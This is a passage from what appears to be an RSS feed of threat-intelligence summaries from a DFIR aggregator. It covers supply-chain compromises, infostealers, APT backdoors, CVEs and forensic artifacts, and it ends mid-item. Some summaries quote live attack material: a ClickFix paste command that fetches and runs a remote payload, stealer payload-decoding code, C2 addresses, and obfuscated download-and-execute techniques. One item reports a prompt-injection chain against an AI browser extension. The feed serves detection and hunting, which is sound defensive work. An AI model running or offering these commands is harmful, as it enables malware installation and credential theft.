channel.title: DFIR Radar
channel.description: Keeping DFIR Intelligence on your Radar. The best DFIR research from hundreds of sources, filtered for relevance.

item.title: AI Threat Landscape Digest January-February 2026
item.description:
VoidLink malware framework demonstrates AI-assisted development has reached operational maturity - a single developer using commercial AI tools produced 88,000 lines of deployment-ready code in under a week.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2038209993737138435

item.title: Business Email Compromise Investigation Walkthrough
item.description:
BEC walkthrough shows compromised accounting firm account led to payment diversion attempt and mass phishing campaign. Post includes KQL queries for M365 data collection and inbox rule analysis for timeline reconstruction.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2038194896562274695

item.title: An open-source forensic exporter for ChatGPT conversations (SHA-256 hashing, verification, full project enumeration)
item.description:
New open-source tool enables forensic collection of complete ChatGPT conversation histories with cryptographic verification and structured export capabilities. Addresses key challenges in AI chat platform evidence preservation.
Technical features: • Chrome DevTools Protocol integration extracts auth tokens, bypasses UI limitations • SHA-256 hashing with CSV manifest tracking ensures chain of custody integrity • Multi-phase discovery process handles hidden projects beyond sidebar API (only shows ~5 pinned) • Tree structure parsing captures conversation branches, edits, and regenerations • Team/Enterprise workspace support requires separate account ID headers
Collection challenges solved: • Rate limiting mitigation through exponential backoff and automatic retry logic • Resume functionality for interrupted collections maintains forensic continuity • PDF conversion scripts generate court-ready formatted outputs • Post-collection verification script detects hash mismatches and missing artifacts
DFIR practitioners can leverage this for AI-assisted investigation cases, IP theft involving AI tools, and employee misconduct investigations. Tool provides faster, more complete extraction than OpenAI's native 24-48hr export delays.
Available on GitHub at chatgpt-forensic-exporter. Consider for ChatGPT evidence collection workflows and personal data backup scenarios.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2038119398448439584

item.title: The Sequels Are Never As Good, But We're Still In Pain (Citrix NetScaler CVE-2026-3055 Memory Overread)
item.description:
Watchtowr Labs analyzes CVE-2026-3055, another Citrix NetScaler memory overread vulnerability affecting appliances configured as SAML IdPs. CVSS 9.3 flaw echoes previous CitrixBleed incidents with session data disclosure potential.
Technical breakdown: • CVE-2026-3055 affects NetScaler ADC/Gateway versions before 14.1-26.x when configured as SAML Identity Provider • Vulnerability triggered by sending minimal SAML AuthnRequest without AssertionConsumerServiceURL parameter • Memory disclosure occurs in NSC_TASS cookie containing fragments like 0xdeadbeef markers and previous request data • Exploitation leaves verbose logs in /var/log/ns.log with malformed ProtocolBinding entries • Patched versions return "Parsing of presented Assertion failed" error instead of cookies
Attack vector requires POST to /saml/login endpoint with crafted base64-encoded XML payload missing specific SAML parameters. Memory disclosure limited to ~100 bytes per attempt, terminated by NULL bytes.
Detection opportunity: Monitor for NSC_TASS cookies issued after malformed SAML requests and unusual /var/log/ns.log entries with truncated ProtocolBinding values.
Hunt for appliances returning cookies instead of parsing errors when processing minimal SAML requests. Watchtowr provides detection payload in their analysis.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037998644322783310

item.title: Azure Blob Storage Misconfigurations: Attacker’s Gateway to Data
item.description:
New research demonstrates Azure Blob Storage container-level misconfigurations enable anonymous attackers to enumerate and access sensitive files without authentication.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037983555473805361

item.title: Compromising Telecom Systems: Deploying and Detecting the BPFDoor Backdoor
item.description:
Chinese 🇨🇳 Red Menshen APT deploys BPFdoor backdoor in telecom networks using Berkeley Packet Filter to bypass firewalls and remain dormant until "magic packet" activation. Operates at kernel level, invisible to standard network monitoring.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037923267021869568

item.title: New Infinity Stealer malware grabs macOS data via ClickFix lures
item.description:
New Infinity Stealer targets macOS via ClickFix fake CAPTCHA lures, deploying Python payload compiled with Nuitka for evasion. Steals browser creds, Keychain, crypto wallets, and dev secrets.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037908046337216549

item.title: Кібератака UAC-0255 під виглядом сповіщення від CERT-UA із застосуванням програмного засобу AGEWHEEZE (CERT-UA#21075)
item.description:
Ukrainian 🇺🇦 CERT-UA identifies UAC-0255 impersonating CERT-UA in phishing campaign distributing AGEWHEEZE malware via password-protected archives. Targets include government orgs, medical centers, financial institutions, and software developers.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037862824664236218

item.title: Coruna exploit reveals evolution of Triangulation iOS exploitation framework
item.description:
Kaspersky confirms Coruna iOS exploit kit is an evolved version of 2023 Operation Triangulation framework, not patchwork reuse. Updated kernel exploits support iOS 17.2 and newer Apple chips while maintaining same codebase structure.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037833597516759543

item.title: Malware & Phishing Threat Landscape Report – 2025/2
item.description:
Second half 2025 saw sustained ransomware growth (6,937 victims on leak sites), rapid malware delivery tool rotation, and ClickFix becoming the top initial access method at 47% of Microsoft incidents.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037821821618204807

item.title: Microsoft Authenticator’s Unclaimed Deep Link: A Full Account Takeover Story (CVE-2026–26123)
item.description:
CVE-2026-26123: Microsoft Authenticator failed to claim its ms-msa:// deep link, allowing malicious apps to intercept authentication tokens during QR setup and achieve full account takeover bypassing 2FA. Update immediately.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037787372553949263

item.title: China-Linked Red Menshen Uses Stealthy BPFDoor Implants to Spy via Telecom Networks
item.description:
Chinese 🇨🇳 Red Menshen (Earth Bluecrow) embeds stealthy BPFDoor implants in telecom infrastructure for long-term espionage against government networks. Campaign demonstrates advanced positioning tactics for persistent access.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037772917325410537

item.title: A cunning predator: How Silver Fox preys on Japanese firms this tax season
item.description:
Silver Fox targets Japanese 🇯🇵 manufacturers with seasonal tax and HR-themed spearphishing, deploying ValleyRAT during high-volume business communications period. Attackers impersonate executives and use company names in subject lines.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037756871231115487

item.title: Metasploit Wrap-Up 03/27/2026
item.description:
Metasploit adds 3 new exploit modules including CVE-2026-23767 (ESC/POS printer RCE), CVE-2025-12548 (Eclipse Che unauthenticated RCE), and CVE-2023-2868 (Barracuda ESG command injection). Enhanced NTLM relay compatibility with Linux smbclient.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037745142262616536

item.title: Researchers release tool to detect stealthy BPFDoor implants in critical infrastructure networks
item.description:
Rapid7 releases scanning script to detect BPFDoor implants used by Chinese 🇨🇳 Red Menshen APT targeting global telecommunications infrastructure. Critical tool for telcos facing persistent nation-state threats.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037741840233816497

item.title: Unpatchable Vulnerabilities of Kubernetes: CVE-2020-8561
item.description:
CVE-2020-8561 enables SSRF attacks by chaining validatingwebhookconfigurations with debug log manipulation on Kubernetes API servers. Particularly dangerous in managed cloud environments where attackers can probe CSP networks from control plane.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037726691972301088

item.title: ShadowPrompt: Zero-Click Prompt Injection Chain in Anthropic’s Claude Chrome Extension
item.description:
Zero-click prompt injection chain "ShadowPrompt" in Anthropic's Claude Chrome extension allowed attackers to control AI prompts via malicious webpages. Fixed in extension v1.0.41 - update immediately and audit AI browser tools.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037711697100648524

item.title: Digital Forensics: Analyzing Fake Software
item.description:
Analysis of fake Sysinternals software reveals multi-stage info stealer using VMware-themed persistence via Windows service. Amcache registry shows publisher inconsistencies—genuine Microsoft tools never reference "Sysinternals, Inc."
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037696671446950178

item.title: ClickFix: Stopped at ⌘+V
item.description:
macOS 26.4 introduces new ES_EVENT_TYPE_RESERVED_* events that enable network monitoring through Endpoint Security framework, eliminating need for Network Extensions.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037681400615260642

item.title: TeamPCP Pushes Malicious Telnyx Versions to PyPI, Hides Stealer in WAV Files
item.description:
TeamPCP compromised telnyx Python package versions 4.87.1 and 4.87.2 on PyPI, hiding credential stealer in WAV audio files. Check your Python environments for these malicious packages immediately.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037666468297605285

item.title: Backdoored Telnyx PyPI package pushes malware hidden in WAV audio
item.description:
TeamPCP compromised Telnyx PyPI package (740k monthly downloads), hiding credential-stealing malware in WAV audio files using steganography. Versions 4.87.1-4.87.2 affected - roll back to 4.87.0 and rotate all secrets immediately.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037651176766812336

item.title: PolyKG Discovers Previously Unreported OilRig Samples Using Stolen Cert
item.description:
Iranian 🇮🇷 OilRig APT using stolen Entrust EV certificate from Thai 🇹🇭 IT vendor MOSCII to sign Karkoff backdoor and other payloads. EGAT energy sector themes suggest supply chain compromise targeting Thailand's 🇹🇭 critical infrastructure.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037636148558758177

item.title: Linux Forensic Scenario
item.description:
New Linux IR challenge scenario available featuring CI/CD compromise with reverse shell activity and unexplained CPU usage. UAC dataset provided for hands-on practice - submissions due April 15th.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037621302257692935

item.title: Famous Telnyx Pypi Package compromised by TeamPCP
item.description:
TeamPCP supply chain group compromises popular Telnyx PyPI package using WAV steganography. Third attack in 8 days delivers OS-specific payloads hidden in fake audio files, maintaining same C2 infrastructure across campaign waves.
Key technical details: • Malicious versions 4.87.1 & 4.87.2 published March 27, 2026 to PyPI • WAV steganography hides payloads: ringtone.wav (Linux/macOS Python script), hangup.wav (Windows PE) • C2 server 83.142.209.203:8080 serves different endpoints per OS detection • XOR decoding with 8-byte key embedded in audio frame data • Windows: drops msbuild.exe to %APPDATA%\Startup\ for persistence (T1547.001) • Linux/macOS: detached subprocess with start_new_session=True survives parent termination
Payload extraction technique: ```python raw = base64.b64decode(w.readframes(w.getnframes())) s, data = raw[:8], raw[8:] payload = bytes([data[i] ^ s[i % len(s)] for i in range(len(data))]) ```
Same infrastructure as previous LiteLLM attack: identical RSA keys, tpcp.tar.gz exfil format, AES-256-CBC + RSA-OAEP encryption.
Hunt for outbound connections to 83.142.209.203:8080 and check Python site-packages for unexpected WAV downloads or XOR operations in import-time code.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037606063059443955

item.title: TeamPCP Targets Telnyx Package in Latest PyPI Software Supply Chain Attack
item.description:
TeamPCP compromised official Telnyx Python SDK on PyPI by stealing maintainer credentials, injecting credential-harvesting malware into versions 4.87.1 and 4.87.2. Group now partners with Vect ransomware for supply chain attacks.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037590946800365707

item.title: TeamPCP Supply Chain Campaign: Update 002 - Telnyx PyPI Compromise, Vect Ransomware Mass Affiliate Program, and First Named Victim Claim, (Fri, Mar 27th)
item.description:
TeamPCP supply chain attack expands with Telnyx PyPI package compromise and Vect ransomware affiliate recruitment. SANS tracking active campaign with first confirmed victim claims emerging.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037575848761434509

item.title: Under CTRL: Dissecting a Previously Undocumented Russian .Net Access Framework
item.description:
Russian 🇷🇺-origin "CTRL" toolkit discovered combining credential phishing, keylogging, RDP hijacking, and FRP tunneling in single .NET framework. Zero detections across VirusTotal and public feeds indicate privately developed tool not yet in broad circulation.
Key Technical Details: • Delivery via weaponized LNK (Private Key.lnK) executing 6-stage payload chain through PowerShell, registry storage, and AES-256-CBC encrypted .NET assemblies • Infrastructure: hui228[.]ru (194.33.61[.]36, 109.107.168[.]18) on Partner Hosting LTD AS215826, FRP server port 7000 with auth token "ADAD" • Sophisticated Windows Hello phishing using victim's real display name/photo, UI automation to validate PINs against actual Windows auth, blocked escape keys (Alt+Tab/F4/Win) • Persistence via 4 scheduled tasks (DriverSvcTask, NetTcpSvc, TermSvcHost, WindowsHealthMonitor) loading payloads from registry values disguised as Explorer settings • C2 architecture routes all interaction through FRP reverse tunnels to RDP sessions, avoiding traditional beacon patterns
DFIR Artifacts: • Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ values ShellStateVersion1/IconSizeVersion1/IconUnderlineVersion1 • Files: C:\ProgramData\SystemTools\ctrl.exe, C:\Temp\keylog.txt, C:\ProgramData\frp\frpc.toml • Named pipe: ctrlPipe for local C2 communication • Hidden user accounts (Administrator/Admin/Windows) with password "ADAD"
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037545573557862660

item.title: Threat Hunting with OpenCTI + OpenAEV + Splunk ESCU
item.description:
Comprehensive framework for intelligence-driven threat hunting using OpenCTI PIRs to scope hypotheses, Splunk ESCU detections mapped to ATT&CK, and OpenAEV simulation to validate coverage gaps.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037530480828875017

item.title: Microsoft Power BI API Credential Exposure: From Public Postman Workspace to Data Exfiltration in…
item.description:
Asian government emergency services exposed live dispatch records and personnel data via Power BI credentials left in public Postman workspace. API access skipped entire kill chain—no exploitation needed.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037515404915126726

item.title: Reflecting on Your Tier Model: CVE-2025-33073 and the One-Hop Problem
item.description:
CVE-2025-33073 resurrects NTLM reflection attacks, enabling domain compromise through unconstrained delegation hosts without admin access. Any domain user can now exploit unpatched systems to capture DC TGTs and DCSync.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037500449629294592

item.title: Bogus Avast website fakes virus scan, installs Venom Stealer instead
item.description:
Fake Avast website delivers Venom Stealer via bogus virus scans, masquerading as Chrome service (v20svc.exe) to steal browser sessions, crypto wallets, and credentials. Uses direct syscalls to evade EDR detection.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037485597292679572

item.title: China-linked Red Menshen APT deploys stealthy BPFDoor implants in telecom networks
item.description:
Chinese 🇨🇳 Red Menshen APT deploys BPFDoor kernel-level implants in Middle Eastern and Asian telecom networks since 2021. These "digital sleeper cells" activate via magic packets, bypassing traditional detection methods.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037455094946402582

item.title: EtherRAT Techniques Bypass Security Via Ethereum Smart Contracts
item.description:
EtherRAT malware uses Ethereum smart contracts to hide C2 infrastructure, allowing cheap rotation and avoiding takedowns. Node.js-based backdoor steals crypto wallets and cloud credentials after ClickFix initial access.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037439838182605195

item.title: AI Infrastructure LiteLLM Supply Chain Poisoning Alert
item.description:
TeamPCP group compromised LiteLLM AI gateway via supply chain poisoning, stealing 500K credentials including SSH keys, cloud certs, and K8s tokens. Malicious versions 1.82.7/1.82.8 deployed backdoors across infected clusters.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037409781762170899

item.title: Iran-Linked Pay2Key Ransomware Group Re-Emerges
item.description:
Iranian 🇮🇷 Pay2Key ransomware returns with enhanced anti-forensics capabilities, targeting US 🇺🇸 healthcare via TeamViewer persistence and credential harvesting. Group completed full infrastructure encryption in 3 hours while destroying evidence.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037364425896644853

item.title: Your AI Gateway Was a Backdoor: Inside the LiteLLM Supply Chain Compromise
item.description:
TeamPCP's sophisticated supply chain attack compromised LiteLLM AI proxy service, exposing concentrated API keys and cloud credentials across multiple ecosystems. Demonstrates AI gateways as critical attack vectors in modern infrastructure.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037349722298405030

item.title: Researchers uncover WebRTC skimmer bypassing traditional defenses
item.description:
New payment skimmer uses WebRTC DataChannels instead of HTTP to steal card data, bypassing CSP controls and network detection. Exploits PolyShell in Magento stores with encrypted UDP traffic invisible to standard security tools.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037334777976467486

item.title: WebRTC Skimmer Bypasses CSP to Steal Payment Data from E-Commerce Sites
item.description:
New payment skimmer bypasses CSP using WebRTC data channels instead of HTTP requests to load payloads and exfiltrate stolen payment data from e-commerce sites. Hunt for unusual WebRTC connections in browser network activity.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037319318489202712

item.title: Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government
item.description:
Unit 42 identifies multiple cyberespionage clusters targeting Southeast Asian government with USBFect, RATs and custom loaders. Coordinated campaign suggests high-value intelligence collection operation.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037304132185608647

item.title: TeamPCP Expands Supply Chain Campaign With LiteLLM PyPI Compromise
item.description:
TeamPCP compromised LiteLLM PyPI package (95M+ downloads) with credential-stealing malware targeting Kubernetes environments. Malicious versions 1.82.7/1.82.8 harvested SSH keys, cloud creds, and crypto wallets before installing backdoors.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037288909198250481

item.title: Tracking & Detecting GhostSocks Malware
item.description:
GhostSocks malware converts compromised devices into residential proxies using SOCKS5/TLS, enabling threat actors to bypass IP detection with "clean" household IPs. Now bundled with Lumma Stealer for widespread distribution.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037273852120829991

item.title: TeamPCP Supply Chain Campaign: Update 001 - Checkmarx Scope Wider Than Reported, CISA KEV Entry, and Detection Tools Available, (Thu, Mar 26th)
item.description:
TeamPCP supply chain campaign scope expanded beyond initial reports with new CISA KEV entry and detection tools now available. Campaign timeline spans Feb 28 initial access through March 24 LiteLLM PyPI compromise.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037258729310343262

item.title: Disabling Security Features in a Locked BIOS
item.description:
New MDSec research shows how to bypass BIOS locks by directly patching Dell UEFI firmware at flash level, disabling DMA protections while preserving secure appearance.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037247547278770497

item.title: Infiniti Stealer: a new macOS infostealer using ClickFix and Python/Nuitka
item.description:
First documented macOS campaign combining ClickFix social engineering with Nuitka-compiled Python stealer. Infiniti Stealer bypasses traditional defenses by tricking users into running Terminal commands themselves.
Key Technical Details: • ClickFix delivery via fake Cloudflare CAPTCHA at update-check[.]com, instructs users to paste: bash <(curl -sSfL $(echo aHR0cHM6Ly91cGRhdGUtY2hlY2suY29tL20vN2Q4ZGYyN2Q5NWQ5 | base64 --decode)) • Stage 1: Bash dropper removes quarantine flag (xattr -dr com.apple.quarantine), uses shared MacSync/SHub template • Stage 2: Nuitka-compiled Mach-O binary (~8.6MB) with KAY header signature (4b 41 59 28 b5 2f fd) + zstd compression • Stage 3: Python 3.11 stealer targeting browsers, Keychain, crypto wallets, .env files
Evasion & Exfiltration: • VM detection for any.run, Joe Sandbox, Hybrid Analysis, VMware, VirtualBox • Randomized execution delays, HTTP POST exfiltration • Telegram notifications to operators, queues credentials for server-side cracking
Hunt for recent Mach-O binaries in /tmp/ with KAY headers, unsigned executables removing quarantine attributes, and outbound connections to low-reputation domains from Terminal processes.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037243810363642016

item.title: Elastic Security Labs uncovers BRUSHWORM and BRUSHLOGGER
item.description:
Elastic Security Labs discovers BRUSHWORM backdoor and BRUSHLOGGER keylogger targeting South Asian 🇮🇳 financial institution. Custom malware pair features USB worm capabilities, broad file theft, and system-wide keystroke capture.
Key technical details: • BRUSHWORM (paint.exe): Modular backdoor with AES-CBC encrypted config, scheduled task persistence (MSGraphics), anti-analysis checks (screen resolution, hypervisor detection), and USB propagation using social engineering filenames • BRUSHLOGGER (libcurl.dll): DLL side-loading keylogger with system-wide WH_KEYBOARD_LL hook, XOR encryption (key 0x43), mutex "Windows-Updates-KB852654856" • C2 infrastructure: resources.dawnnewsisl[.]com/updtdll with Let's Encrypt SSL certificate • File theft targets 40+ extensions including .doc, .xls, .ppt, .pdf, .pst, .py across removable/optical drives • Installation paths: C:\ProgramData\Photoes\Pics\ (main), C:\Users\Public\Libraries\ (modules), staging in C:\Users\Public\Systeminfo\
DFIR artifacts: • Scheduled tasks: MSGraphics, MSRecorder using COM Task Scheduler • Registry persistence indicators and file hash tracking in C:\Users\Public\AppData\Roaming\NuGet\hashconfig • Multiple development versions (V1.exe, V2.exe, V4.exe) found on VirusTotal indicate active toolset refinement
Hunt for scheduled tasks executing from unusual paths, monitor USB autorun creation, and baseline normal DLL side-loading behavior in your environment.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037232281123803164

item.title: Scarlet Goldfinch’s year in ClickFix
item.description:
Scarlet Goldfinch threat actor evolved through 7 distinct "epochs" of paste-and-run tactics in 2025, ranking as 6th most prevalent threat. Campaign demonstrates rapid adaptation to defenses with continuous command-line obfuscation techniques.
Key Technical Details: • Evolution from fake browser updates to ClickFix/paste-and-run lures tricking users into executing malicious PowerShell/cmd commands • Epoch 7 (Jan 2026-present): Split download/execute using curl + mshta with delayed environment variable expansion (cmd.exe /v:on) • Advanced obfuscation: escape characters (^s^t^a^r^t^), substring variable manipulation to scramble commands like "curl" • Kill chain: Paste-and-run → HTA download → Remcos DLL sideloading → NetSupport Manager persistence • Final payloads include StealC and ArechClient2 info stealers
Attack Methodology: • Initial access via compromised websites displaying fake CAPTCHA/error messages (T1204.004) • Creates 7-10 digit staging folders in AppData\Local for payload deployment • Uses legitimate executables for DLL sideloading to evade detection • Establishes persistence through NetSupport Manager remote access tool
DFIR Artifacts: • Monitor for mshta.exe network connections and HTA file downloads • Hunt for curl commands with suspicious file extensions masquerading as PDFs • Look for tar -xf extraction in AppData\Local with random numeric folder names • Detection opportunity: cmd.exe /v:on flag usage with delayed variable expansion
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037213634628345908

item.title: Coruna iOS exploit framework linked to Triangulation attacks
item.description:
Coruna iOS exploit framework is an evolution of Operation Triangulation, now targeting A17/M3 chips and iOS 17.2 with 5 exploit chains using 23 vulnerabilities. Framework expanded from precision espionage to cryptocurrency theft campaigns.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037198361351127523

item.title: GlassWorm attack installs fake browser extension for surveillance
item.description:
GlassWorm targets developers via compromised npm/PyPI packages, then installs fake "Google Docs Offline" Chrome extension for surveillance. Uses Solana blockchain for C2 discovery and DHT lookups to evade detection.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037183518351253622

item.title: BPFdoor in Telecom Networks: Sleeper Cells in the Backbone
item.description:
Chinese 🇨🇳 APT group Red Menshen plants kernel-level BPFdoor backdoors in global telecom networks, creating "sleeper cells" for long-term espionage. New variants hide in HTTPS traffic and monitor 4G/5G signaling protocols.
Key findings: • BPFdoor evolved from magic packet activation to Layer-7 HTTPS camouflage with RC4-MD5 encryption • Implants target SCTP signaling protocols used in 4G/5G core networks for subscriber tracking • Masquerades as legitimate services like HPE ProLiant hardware daemons and Docker containers • ICMP tunneling enables covert C2 between compromised hosts using 0xFFFFFFFF terminal markers • Affects telecom edge infrastructure: Ivanti VPNs, Cisco/Juniper routers, Fortinet firewalls
Attack chain leverages: • Initial access via T1190 exploitation of public-facing telecom appliances • CrossC2 beacons for Linux post-exploitation and lateral movement • TinyShell passive backdoors on boundary devices for persistence • Custom keyloggers with telecom-specific credential lists (usernames like "imsi")
DFIR artifacts include raw socket usage, anomalous BPF filters in kernel space, unexpected hardware service processes on non-HPE systems, and HTTPS traffic with fixed-offset padding schemes.
Hunt for unusual BPF syscalls, processes mimicking bare-metal hardware services on virtualized systems, and SCTP traffic inspection on non-telecom hosts.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037168338401374612

item.title: Kubernetes forensics 1/3 : what the container ?
item.description:
Synacktiv breaks down container forensics fundamentals as Kubernetes attacks surge in 2025. Essential primer on analyzing Docker vs Podman environments, OverlayFS artifacts, and containerized threat hunting techniques.
Container architecture deep dive: • Containers = Linux processes with namespaces, cgroups, seccomp isolation (not VMs) • Docker uses daemon + containerd + runc stack; Podman is daemonless with conmon + crun • OCI specifications enable cross-platform compatibility (Runtime, Image, Distribution specs) • OverlayFS layers: UpperDir (runtime changes), LowerDir (base image), MergedDir (combined view)
Key forensic artifacts: • Docker: /var/lib/docker/overlay2/, /var/lib/docker/containers/<id>/<id>.log, config.v2.json • Podman rootless: ~/.local/share/containers/storage/, journalctl CONTAINER_ID_FULL=<id> • Engine logs via journalctl -xeu docker.service or podman events --since <date>
Investigation tools: • Live: docker/podman export, save, diff, cp commands for container extraction • Postmortem: wagoodman/dive for layer analysis, diffoci for image comparison, docker-explorer for mounting
Hunt for unauthorized files in UpperDir layers and compare suspicious images against known-good baselines using diffoci to identify tampering.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037153116282290316

item.title: An AI gateway designed to steal your data
item.description:
Supply chain attack compromises LiteLLM Python library used by AI developers worldwide. Attackers injected data-stealing malware into PyPI versions, targeting cloud credentials, databases, and Kubernetes infrastructure.
Key technical details: • Compromised versions litellm==1.82.7 & 1.82.8 on PyPI (March 24, 2026) • Malicious code in proxy_server.py (v1.82.7) and litellm_init.pth (v1.82.8) • Base64-encoded payload creates p.py, exfiltrates data via AES-256-CBC + RSA encryption • C2 domains: models[.]litellm[.]cloud, checkmarx[.]zone
Attack methodology: • Targets AWS IMDS (169.254.169.254), ECS metadata (169.254.170.2) for runtime secrets • Steals SSH keys, .env files, database configs, crypto wallets, Slack/Discord webhooks • Kubernetes privilege escalation via securityContext.privileged=true pods • Persistence through /root/.config/sysmon/sysmon.py registered as systemd service
DFIR artifacts: • ~/.config/sysmon/sysmon.py files on compromised hosts • /tmp/.pg_state, /tmp/pglog, session.key, tpcp.tar.gz files • Suspicious privileged pods with hostPath mounts in K8s clusters • Network connections to C2 infrastructure
Global impact spans Russia 🇷🇺, China 🇨🇳, Brazil 🇧🇷, Netherlands 🇳🇱, UAE 🇦🇪 with secondary NodeJS variant targeting Checkmarx extensions.
Hunt for Base64-encoded Python files executing at interpreter startup and unusual sysmon processes outside legitimate Microsoft Sysmon deployments.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037138193674293627

item.title: Active Magecart Campaign Targets Spain, Leveraging Redsys Payment Mimicry and Hijacking
item.description:
24-month Magecart campaign hijacks Spanish 🇪🇸 e-commerce checkout flows using Redsys payment mimicry and WebSocket exfiltration across 100+ domains. Hunt for suspicious jQuery/CDN domains and WebSocket connections during checkout processes.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037122822003450286

item.title: ip6.arpa Wildcard Abuse: Hunting Phishing Infrastructure Across IPv6 Prefixes
item.description:
Attackers abusing ip6.arpa wildcard DNS entries to bypass traditional blocklists and email security controls in phishing campaigns. This IPv6 technique creates critical blind spots in standard detection mechanisms.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037107875999605140

item.title: VU#330121: IDrive for Windows contains local privilege escalation vulnerability
item.description:
IDrive for Windows (≤7.0.0.63) allows any authenticated user to escalate to SYSTEM via writable files in C:\ProgramData\IDrive that control service execution (CVE-2026-1995). Restrict directory permissions until patch arrives.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037092923121016924

item.title: Exploring windows artifacts notepad files | u0041
item.description:
New Windows 11 Notepad artifacts reveal detailed user activity including file content, editing history, and unsaved changes. TabState files in %LOCALAPPDATA%\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState contain comprehensive forensic evidence.
Key technical details: • Files stored as <GUID>.bin in TabState folder with complete structure documented • Contains full file paths, SHA256 hashes, last write times, and complete file content (even 500MB+ files) • UnsavedChunk structures track every keystroke with cursor positions and CRC32 checksums • Recent Notepad v11.2508.38.0 removes file content/hashes from saved files but retains formatting metadata
DFIR opportunities: • Recovers content from deleted files if Notepad was used to view them • Detailed editing timeline through UnsavedChunk sequences showing character-by-character changes • File access evidence via full paths and timestamps even for temporarily viewed files • Text encoding detection (ANSI, UTF-8, UTF-16) and carriage return analysis
Hunt for TabState artifacts using glob pattern: C:\Users\*\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\????????-????-????-????-????????????.bin
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037087415777538529

item.title: Coruna: the framework used in Operation Triangulation
item.description:
Kaspersky analyzed Coruna exploit kit and confirmed it's an updated version of the Operation Triangulation framework, now used in watering-hole attacks in Ukraine 🇺🇦 and financial attacks in China 🇨🇳.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037077759915126819

item.title: New Whitepaper: Exploiting Cellular-based IoT Devices
item.description:
New Rapid7 research shows attackers with physical access can exploit cellular IoT modules to pivot into cloud environments and hide C2 channels in legitimate device traffic.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2037062536118362385

item.title: When Your Scanner Becomes the Weapon: From Trivy to LiteLLM
item.description:
Multi-stage supply chain attack compromised LiteLLM AI proxy via poisoned Trivy scanner, affecting 36% of cloud environments. Attackers harvested cloud credentials and cryptocurrency wallets from infected PyPI packages.
Key technical details: • Malicious versions 1.82.7 and 1.82.8 published to PyPI on March 24, 2026 for ~5.5 hours • Version 1.82.8 used litellm_init.pth file in site-packages for persistence across all Python processes • Payload harvested AWS IMDS credentials, SSH keys, K8s secrets, crypto wallets via /proc/<pid>/mem scraping • Exfiltration to models.litellm[.]cloud via AES-256 encryption, C2 at checkmarx[.]zone
Attack chain methodology: • Initial compromise: Poisoned Trivy v0.69.4 binary scraped GitHub Actions runner memory • Credential theft: Extracted PYPI_PUBLISH_PASSWORD token bypassing GitHub secret masking • Package weaponization: Used stolen token to upload malicious versions directly to PyPI • Lateral movement: Deployed privileged Kubernetes pods named node-setup-* across clusters
DFIR artifacts and IOCs: • Persistence file: ~/.config/sysmon/sysmon.py and systemd service • Network indicators: Outbound connections to models.litellm[.]cloud and checkmarx[.]zone • K8s indicators: Search for node-setup-* pods in kube-system namespace • File system: litellm_init.pth in Python site-packages directories
